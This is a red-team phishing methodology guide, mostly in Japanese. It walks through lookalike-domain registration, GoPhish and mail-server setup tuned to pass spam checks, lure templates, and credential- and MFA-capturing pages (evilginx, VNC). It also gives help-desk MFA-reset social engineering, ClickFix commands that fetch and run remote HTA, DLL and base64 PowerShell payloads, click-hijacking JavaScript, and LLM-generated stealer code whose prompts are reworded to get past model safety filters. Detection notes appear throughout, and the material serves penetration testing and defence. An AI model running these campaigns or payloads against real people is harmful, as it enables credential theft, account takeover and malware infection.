# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を Recon する
1. **victim domain** を選択する。
2. 被害者が使っている **login portals** を **検索** し、どれを **impersonate** するか **決定** するために、基本的な web enumeration を行う。
3. **OSINT** を使って **emails** を見つける。
2. 環境を準備する
1. phishing assessment に使う **domain** を **購入** する
2. 関連する email service のレコード (**SPF, DMARC, DKIM, rDNS**) を **設定** する
3. **gophish** を使うように VPS を設定する
3. キャンペーンを準備する
1. **email template** を準備する
2. 認証情報を盗むための **web page** を準備する
4. キャンペーンを開始する！

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: ドメイン名に元のドメインの重要な **keyword** が **含まれる**（例: zelster.com-management.com）。
- **hypened subdomain**: サブドメインの **ドットをハイフンに変更** する（例: www-zelster.com）。
- **New TLD**: 同じドメインで **新しい TLD** を使う（例: zelster.org）
- **Homoglyph**: ドメイン名の文字を、**見た目が似た文字** に置き換える（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の **2 文字を入れ替える**（例: zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に “s” を **追加または削除** する（例: zeltsers.com）。
- **Omission**: ドメイン名から **1 文字を削除** する（例: zelser.com）。
- **Repetition:** ドメイン名内の文字のうち **1 文字を繰り返す**（例: zeltsser.com）。
- **Replacement**: homoglyph に似ているが、より stealthy ではない。ドメイン名の文字の 1 つを、元の文字のキーボード上で近い位置にある文字などに置き換える（例: zektser.com）。
- **Subdomained**: ドメイン名の中に **dot** を挿入する（例: ze.lster.com）。
- **Insertion**: ドメイン名に文字を **挿入** する（例: zerltser.com）。
- **Missing dot**: TLD をドメイン名に付ける。（例: zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

**bit** が保存中または通信中に、太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、自動的に反転してしまう **可能性** がある。

この概念を **DNS requests** に **適用** すると、**DNS server が受け取る domain** は最初に要求された domain と同じではない可能性がある。

たとえば、"windows.com" の単一 bit を変更すると "windnws.com" に変わることがある。

攻撃者は、被害者の domain に似た複数の bit-flipping domains を登録することで、これを **悪用** できる。目的は、正規の users を自分の infrastructure にリダイレクトすることだ。

詳細は [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) を参照。

### Buy a trusted domain

[https://www.expireddomains.net/](https://www.expireddomains.net) で、使えそうな expired domain を検索できる。\
購入する expired domain に **すでに良い SEO がある** ことを確認するために、以下でどのように分類されているかを確認するとよい。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

より多くの有効な email address を **見つける**、またはすでに見つけたものを **検証する** ために、被害者の smtp servers に対して brute-force できるか確認できる。 [ここで email address の検証/発見方法を学ぶ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーが mail にアクセスするために **web portal** を使っている場合は、それが **username brute force** に対して脆弱か確認し、可能ならその脆弱性を悪用することを忘れないこと。

## Configuring GoPhish

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) からダウンロードできる。

ダウンロードして `/opt/gophish` 内で展開し、`/opt/gophish/gophish` を実行する。\
出力に、port 3333 の admin user 用 password が表示される。そのため、その port にアクセスしてその credentials を使い、admin password を変更する必要がある。local: にトンネルする必要があるかもしれない。
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

Before this step you should have **already bought the domain** you are going to use and it must be **pointing** to the **IP of the VPS** where you are configuring **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

まずインストールを開始: `apt-get install postfix`

次に、以下のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**また、/etc/postfix/main.cf 内の以下の変数の値も変更します**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** をあなたのドメイン名に変更し、**VPS を再起動**してください。

次に、VPS の **ip address** を指す `mail.<domain>` の **DNS A record** と、`mail.<domain>` を指す **DNS MX** record を作成します

では、メール送信をテストしてみましょう:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish の実行を停止して、設定しましょう。\
`/opt/gophish/config.json` を以下のように変更します（https の使用に注意してください）:
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish サービスを設定する**

gophish サービスを作成して、自動的に起動でき、サービスとして管理できるようにするには、次の内容でファイル `/etc/init.d/gophish` を作成できます:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
サービスの設定を完了し、次を実行して確認します:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### Wait & be legit

ドメインが古いほど、spam として検出される可能性は低くなります。そのため、phishing assessment の前に、できるだけ長く（少なくとも1週間）待つべきです。さらに、評判の良い分野に関するページを置くと、得られる reputation はより良くなります。

1週間待つ必要があっても、今のうちにすべての設定は完了できます。

### Configure Reverse DNS (rDNS) record

VPS の IP アドレスがドメイン名に解決されるように、rDNS (PTR) record を設定します。

### Sender Policy Framework (SPF) Record

新しいドメイン用に SPF record を**設定する必要があります**。SPF record とは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net) を使って SPF policy を生成できます（VPS マシンの IP を使用してください）

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

これは、ドメイン内の TXT record に設定する必要がある内容です:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

新しいドメインに対して **DMARC レコードを設定する必要があります**。DMARC レコードが何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指す新しい DNS TXT レコードを作成し、次の内容を設定します：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

新しいドメインに対して **DKIM を設定する必要があります**。DMARC レコードが何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは次をベースにしています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM key が生成する 2 つの B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定スコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使ってできます\
ページにアクセスして、表示されたアドレスにメールを送信してください:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
また、`check-auth@verifier.port25.com` にメールを送信して**メール設定を確認**し、**応答を読む**こともできます（そのためには**ポート 25 を開放**し、root としてメールを送信した場合は _/var/mail/root_ のファイルで応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
また、**自分で管理しているGmailにメッセージを送信**し、Gmailの受信トレイで**メールのヘッダー**を確認することもできます。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

[www.mail-tester.com](https://www.mail-tester.com) のページで、あなたの domain が spamhouse によってブロックされているか確認できます。domain/IP の削除は次からリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​domain/IP の削除は [https://sender.office.com/](https://sender.office.com) からリクエストできます。

## Create & Launch GoPhish Campaign

### Sending Profile

- sender profile を識別するための **name** を設定する
- phishing emails を送信するアカウントを決める。候補: _noreply, support, servicedesk, salesforce..._
- username と password は空欄のままでよいが、**Ignore Certificate Errors** にチェックが入っていることを確認する

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作しているか確認するために "**Send Test Email**" 機能を使うことを推奨します。\
> テストで blacklist に載るのを避けるため、**10min mails addresses** にテストメールを送ることをおすすめします。

### Email Template

- template を識別するための **name** を設定する
- 次に **subject** を書く（奇抜なものではなく、通常の email で読んでも不自然でないものにする）
- "**Add Tracking Image**" にチェックが入っていることを確認する
- **email template** を書く（以下の例のように variables を使えます）：
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **メールの信頼性を高めるために**、クライアントからのメールの署名を使うことをおすすめします。提案:

- **存在しないアドレス** にメールを送り、返信に署名があるか確認する。
- info@ex.com や press@ex.com や public@ex.com のような **公開メール** を探してメールを送り、返信を待つ。
- 発見済みの **有効なメール** に連絡を試み、返信を待つ

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template では、送信する **ファイルを添付** することもできます。特別に細工したファイル/文書を使って NTLM チャレンジも盗みたい場合は、[このページ](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)を読んでください。

### Landing Page

- **名前** を設定する
- Webページの **HTMLコードを書く**。なお、Webページを **import** できます。
- **Capture Submitted Data** と **Capture Passwords** を有効にする
- **redirection** を設定する

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常、ページの HTMLコードを修正し、ローカルでいくつかテスト（たとえば Apache サーバーを使用）して、**結果に満足するまで** 調整する必要があります。その後、その HTMLコードをボックスに書きます。\
> HTML 用に **静的リソース**（CSS や JS のページなど）を使う必要がある場合は、それらを _**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> redirection については、被害者の正規のメイン Webページへ **リダイレクト** することもできますし、たとえば _/static/migration.html_ にリダイレクトして、**ローディングスピナー (**[**https://loading.io/**](https://loading.io)**) を 5 秒間表示し、その後で処理が成功したと示す** こともできます。

### Users & Groups

- 名前を設定する
- **データをインポート** する（例のテンプレートを使うには、各ユーザーの firstname、last name、email address が必要です）

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、group を選んで campaign を作成します。URL は被害者に送られるリンクである点に注意してください。

**Sending Profile では、最終的な phishing email がどのように見えるかを確認するためにテストメールを送信できます**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> テストメールは、ブラックリスト入りを避けるために **10min mails のアドレスへ送る** ことをおすすめします。

すべて準備できたら、campaign を開始するだけです！

## Website Cloning

何らかの理由で website を clone したい場合は、次のページを確認してください:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

いくつかの phishing 評価（主に Red Teams）では、**何らかの backdoor を含むファイルも送信** したくなることがあります（たとえば C2 や、認証をトリガーするだけのもの）。\
例については次のページを確認してください:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前の攻撃は、実際の website を装ってユーザーが入力した情報を収集するので、かなり巧妙です。残念ながら、ユーザーが正しい password を入力しなかった場合や、偽装した application に 2FA が設定されている場合、**この情報だけでは騙されたユーザーになりすますことはできません**。

そこで [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) や [**muraena**](https://github.com/muraenateam/muraena) のようなツールが役立ちます。このツールは MitM のような攻撃を生成できます。基本的に、攻撃は次のように動作します:

1. 実際の webpage の login form を **なりすます**。
2. ユーザーが自分の **credentials** を偽ページに **送信** し、ツールがそれを本物の webpage に送り、**credentials が有効か確認** する。
3. アカウントに **2FA** が設定されている場合、MitM ページがそれを要求し、ユーザーがそれを **入力** すると、ツールがそれを本物の web page に送る。
4. ユーザーが認証されると、あなた（攻撃者）は、ツールが MitM を実行している間のあらゆるやり取りから、**credentials、2FA、cookie、その他すべての情報** を取得できます。

### Via VNC

もし、元のものと同じ見た目の **悪意あるページに被害者を送る** のではなく、**本物の web page に接続された browser を持つ VNC session に送る** としたらどうでしょうか？ 彼の操作を見ることができ、password、使用した MFA、cookie などを盗めます...\
これを行うには [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) を使えます。

## Detecting the detection

明らかに、見つかったかどうかを知る最善の方法の一つは、**自分の domain が blacklist に入っていないか探す** ことです。もし listed されていれば、何らかの方法でその domain は suspicious として検出されています。\
自分の domain が blacklist のどこかにあるかを簡単に確認する方法の一つは、[https://malwareworld.com/](https://malwareworld.com) を使うことです。

しかし、被害者が **wild で suspicious な phishing activity を積極的に探している** かどうかを知る他の方法もあります。詳細は次を参照してください:


{{#ref}}
detecting-phising.md
{{#endref}}

被害者の domain と **非常によく似た名前の domain** を購入したり、あなたが管理する domain の **subdomain** に対して、被害者の domain の **keyword** を **含む** certificate を生成したりできます。**被害者** がそれらに対して何らかの **DNS または HTTP interaction** を行えば、**疑わしい domain を積極的に探している** と分かるので、非常に stealth に振る舞う必要があります。

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious) を使って、メールが spam folder に入るのか、block されるのか、成功するのかを評価します。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

現代の intrusion set は、email lure を完全に省略し、**service-desk / identity-recovery workflow を直接狙って** MFA を突破することが増えています。攻撃は完全に "living-off-the-land" です。つまり、operator が有効な credentials を得たら、組み込みの admin tool を使って次の段階へ進みます。 malware は不要です。

### Attack flow
1. 被害者を recon する
* LinkedIn、data breaches、public GitHub などから個人情報と企業情報を収集する。
* 高価値の identity（executive、IT、finance）を特定し、password / MFA reset の **正確な help-desk process** を列挙する。
2. リアルタイム social engineering
* target を装って help-desk に電話、Teams、または chat する（多くの場合 **spoofed caller-ID** や **cloned voice** を使用）。
* 事前に収集した PII を提示して、knowledge-based verification を通過する。
* agent に **MFA secret の reset** や、登録済み mobile number の **SIM-swap** を実行させる。
3. アクセス直後の操作（実際の事例では ≤60 分）
* 何らかの web SSO portal から foothold を確立する。
* 組み込み機能のみで AD / AzureAD を列挙する（binary は落とさない）:
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**、**PsExec**、または環境内で既に allowlist されている正規の **RMM** agent を使って lateral movement する。

### Detection & Mitigation
* help-desk の identity recovery を **privileged operation** として扱い、step-up auth と manager approval を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** ルールを導入し、次を検知する:
* MFA method changed + 新しい device / geo からの authentication.
* 同じ principal の即時昇格（user-→-admin）。
* help-desk call を記録し、reset 前に **既に登録済みの number への折り返し** を必須にする。
* **Just-In-Time (JIT) / Privileged Access** を実装し、新しく reset された account が自動的に高権限 token を継承しないようにする。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew は、高接触の運用コストを、**search engines & ad networks を配信チャネルに変える** 大規模攻撃で相殺します。

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような偽の結果が検索広告の上位に押し上げられる。
2. 被害者は小さな **first-stage loader**（多くの場合 JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader は browser cookies + credential DB を exfiltrate し、その後 **silent loader** を取得する。silent loader はリアルタイムで次のいずれかを展開するか判断する:
* RAT（例: AsyncRAT, RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 新規登録 domain を block し、email だけでなく *search-ads* に対しても **Advanced DNS / URL Filtering** を適用する。
* software installation を署名済み MSI / Store package に制限し、ポリシーで `HTA`、`ISO`、`VBS` の実行を拒否する。
* browser の child process が installer を開くのを監視する:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader に頻繁に悪用される LOLBins を追跡する（例: `regsvr32`, `curl`, `mshta`）。

### Download-button click hijacking with TDS handoff
一部の偽 software portal は、見えている download の `href` を **本物** の GitHub/release URL のままにしつつ、JavaScript で **最初** のユーザー操作を hijack し、代わりに被害者を **Traffic Distribution System (TDS)** chain へ送ります。
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- フックは通常、`document` 上の **capture phase** (`true`) で動作し、サイト側の handler より先に発火する。
- Chrome は、リダイレクトを有効な **user gesture** に紐づけて popup-blocker の回避性を高めるため、`click` の代わりに `mousedown` をよく使う。
- 一部の変種は、先に `about:blank` を開くか、`<a target="_blank">` の click を生成しておき、後から TDS URL を割り当てる。
- Browser 側の上限は `localStorage` に置かれることが多く、**最初の click** は malware に到達する一方、refresh/retry では見た目が benign な visible link にフォールバックすることがある。
- TDS は referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter checks、click context、session ごとの counter で分岐できるため、analyst の replay は non-deterministic になる。

Defender ideas:
- 表示される `href` と、click 時に生成される実際の navigation target を比較する。
- `window.open`、`about:blank`、または synthetic anchor clicks の周辺で `preventDefault()` と `stopImmediatePropagation()` の両方を呼ぶ `document.addEventListener(..., true)` handler を探す。
- 新規登録された software-download ドメインが同じ CloudFront/JS stage をまとめて読み込む cluster は、high-signal な SEO-poisoning/TDS pattern として扱う。

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` は、URL が `.7z` アーカイブを装っていても、**レスポンス先頭の HTA/VBScript を実行**します。後ろに付いたアーカイブデータは、単なる偽装でよい場合があります。
- 後続ステージは、ファイルタイプの偽装を続けることが多く（PowerShell に対して `.rtf`、Python に対して `.asar`、バイナリを詰めた ZIP など）、その後 **manual PE mapping / in-memory execution** に切り替えます。
- これらのチェーンのいずれかに応答している場合は、**最初の成功した実行時の network + memory** を保持してください。後続の再実行では、無害な installer/SFX のパスしか見えないか、payload/key の解放が元の TDS session に結び付いていて失敗することがあります。

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` は payload を `%TEMP%` に落とし、短い sleep で network jitter を隠し、その後 `rundll32` が export された entrypoint (`notepad`) を呼び出します。
* DLL は host identity を beacon し、数分ごとに C2 を poll します。Remote tasking は **base64-encoded PowerShell** として届き、hidden かつ policy bypass 付きで実行されます:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性（server は DLL を更新せずに task を差し替え可能）を維持しつつ、console window を隠せます。`rundll32.exe` の子に対して `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` が一緒に出ていないか確認してください。
* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードが lure をパーソナライズし（例: LogoKit の token parsing）、prompt-hidden endpoint に creds を送信する。

**Evasion traits**
- Traffic は well-known な LLM domains または reputable な CDN proxies にヒットする；場合によっては backend への WebSockets 経由。
- Static payload はなく、悪意ある JS は render 後にのみ存在する。
- Non-deterministic な generations により、セッションごとに **unique** な stealers が生成される。

**Detection ideas**
- JS enabled の sandboxes を実行し、**runtime `eval`/LLM responses 由来の dynamic script creation** をフラグする。
- フロントエンドの LLM APIs への POST の直後に、返された text に対する `eval`/`Function` を追跡する。
- client traffic 内の unsanctioned な LLM domains と、それに続く credential POSTs にアラートを出す。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Classic な push-bombing に加え、operator は help-desk call 中に単純に **new MFA registration を強制**し、user の既存 token を無効化する。 その後の login prompt は victim には legitimate に見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta のイベントを監視し、**`deleteMFA` + `addMFA`** が**同じ IP から数分以内に**発生するものを検知する。



## クリップボード・ハイジャッキング / Pastejacking

攻撃者は、侵害された Web ページや typo squatting された Web ページから、悪意あるコマンドを被害者のクリップボードに密かにコピーし、その後ユーザーに **Win + R**、**Win + X**、またはターミナルウィンドウ内で貼り付けさせるよう誘導して、ダウンロードや添付ファイルなしで任意コードを実行させる。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## モバイル・フィッシング & 悪意あるアプリ配布 (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR を使った WhatsApp デバイスリンク乗っ取りのソーシャルエンジニアリング
* 誘導ページ（例: 偽の ministry/CERT “channel”）に WhatsApp Web/Desktop の QR を表示し、被害者にスキャンするよう指示して、攻撃者を密かに **linked device** として追加する。
* 攻撃者はすぐにチャット/連絡先の可視性を得て、セッションが削除されるまで継続する。被害者は後で「new device linked」通知を見ることがある。防御側は、信頼できない QR ページへの訪問直後に予期しない device-link イベントを追跡できる。

### クローラ/サンドボックス回避のためのモバイル限定フィッシング
オペレーターは、デスクトップのクローラが最終ページに到達しないよう、単純な device check の背後にフィッシングの流れを配置することが増えている。よくあるパターンは、タッチ対応 DOM を判定して結果をサーバーの endpoint に送信する小さなスクリプトで、非モバイルのクライアントには HTTP 500（または空白ページ）を返し、モバイルユーザーには完全な流れを表示する。

最小限の client snippet（典型的なロジック）:
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` のロジック（簡略化）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server の動作としてよく観測されるもの:
- 最初の load 時に session cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` の場合、その後の GET に対して 500（または placeholder）を返す; `true` の場合のみ phishing を提供する。

Hunting と detection の heuristic:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 非 mobile に対して HTTP 500 の sequence; 正規の mobile victim path は 200 を返し、その後 HTML/JS が続く。
- コンテンツを `ontouchstart` や同様の device check のみに条件付けしているページは block するか精査する。

Defence tips:
- crawler を mobile-like fingerprint と JS enabled で実行し、gated content を明らかにする。
- 新規登録 domain 上の `POST /detect` に続く suspicious な 500 response を alert する。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
